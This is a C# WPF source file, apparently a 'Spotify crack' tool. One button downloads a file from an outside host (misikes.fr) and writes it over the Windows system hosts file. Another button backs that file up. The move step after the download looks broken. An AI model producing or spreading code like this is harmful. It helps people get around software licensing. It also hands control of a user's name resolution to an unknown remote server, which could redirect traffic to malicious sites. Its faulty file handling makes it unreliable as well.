using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Diagnostics;
using System.Net;
using System.IO;

namespace crack_spotify
{
    /// <summary>
    /// Logique d'interaction pour MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }


        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            using (var client = new WebClient())
            {
                client.DownloadFile("http://misikes.fr/hosts", @"C:/Windows/System32/drivers/etc/hosts");
            }
            File.Move("C:/Windows/System32/drivers/etc/hosts.txt", "C:/Windows/System32/drivers/etc/hosts");
        }

        private void Button_Click_2(object sender, RoutedEventArgs e)
        {
            File.Copy(@"C:/Windows/System32/drivers/etc/hosts", @"C:/Windows/System32/drivers/etc/SaveHosts");
        }
    }
}
